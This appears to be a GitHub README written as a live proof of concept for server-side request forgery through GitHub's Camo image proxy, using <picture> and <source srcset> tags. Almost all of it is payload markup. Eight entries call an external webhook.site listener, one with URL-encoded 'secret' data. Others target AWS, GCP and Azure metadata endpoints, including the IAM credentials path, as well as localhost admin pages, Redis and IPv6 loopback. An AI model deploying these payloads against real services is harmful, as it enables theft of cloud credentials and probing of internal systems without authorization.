# 🔴 SSRF Validation Tests

Testing GitHub Camo proxy SSRF vulnerability via `<picture>` and `<source srcset>` elements.

**Webhook Listener:** `https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af`

---

## Test 1: Basic SSRF Confirmation
<picture>
  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=1-basic-ssrf">
  <img src="https://via.placeholder.com/1x1" alt="Test 1">
</picture>

---

## Test 2: With Custom Headers Check
<picture>
  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=2-headers&origin=github-camo">
  <img src="https://via.placeholder.com/1x1" alt="Test 2">
</picture>

---

## Test 3: Data in URL Path
<picture>
  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af/ssrf-poc-path-test">
  <img src="https://via.placeholder.com/1x1" alt="Test 3">
</picture>

---

## Test 4: Multiple Query Params
<picture>
  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=4&repo=jessi2000/testrepo&vuln=camo-ssrf&time=1736675000">
  <img src="https://via.placeholder.com/1x1" alt="Test 4">
</picture>

---

## Test 5: URL Encoded Data
<picture>
  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=5&data=%7B%22secret%22%3A%22test123%22%7D">
  <img src="https://via.placeholder.com/1x1" alt="Test 5">
</picture>

---

## Test 6: AWS Metadata Simulation
<picture>
  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=6-aws-meta&simulated_path=/latest/meta-data/iam/security-credentials/">
  <img src="https://via.placeholder.com/1x1" alt="Test 6">
</picture>

---

## Test 7: Internal IP Reference
<picture>
  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=7&internal_target=192.168.1.1">
  <img src="https://via.placeholder.com/1x1" alt="Test 7">
</picture>

---

## Test 8: Timestamp Tracking
<picture>
  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=8-timestamp&viewed_at=2026-01-12T10:00:00Z">
  <img src="https://via.placeholder.com/1x1" alt="Test 8">
</picture>

---

## ⚠️ Cloud Metadata SSRF Tests (Original URLs)

### AWS IMDSv1
<picture>
  <source srcset="http://169.254.169.254/latest/meta-data/">
  <img src="https://via.placeholder.com/1x1" alt="AWS IMDSv1">
</picture>

### GCP Metadata
<picture>
  <source srcset="http://metadata.google.internal/computeMetadata/v1/">
  <img src="https://via.placeholder.com/1x1" alt="GCP Metadata">
</picture>

### Azure IMDS
<picture>
  <source srcset="http://169.254.169.254/metadata/instance?api-version=2021-02-01">
  <img src="https://via.placeholder.com/1x1" alt="Azure Metadata">
</picture>

---

## 🔒 localhost/Internal Tests

### localhost:8080
<picture>
  <source srcset="http://localhost:8080/admin">
  <img src="https://via.placeholder.com/1x1" alt="localhost">
</picture>

### 127.0.0.1 Redis
<picture>
  <source srcset="http://127.0.0.1:6379/">
  <img src="https://via.placeholder.com/1x1" alt="Redis">
</picture>

### IPv6 localhost
<picture>
  <source srcset="http://[::1]:80/">
  <img src="https://via.placeholder.com/1x1" alt="IPv6">
</picture>

---

## 📊 Expected Results

If vulnerable, webhook.site will receive requests from GitHub's Camo proxy (IP: camo.githubusercontent.com) with:
- User-Agent indicating Camo
- Original URL preserved
- Request headers from GitHub's infrastructure

**Check results at:** https://webhook.site/#!/view/faf9e600-45b8-4000-a537-1013dcdf16af
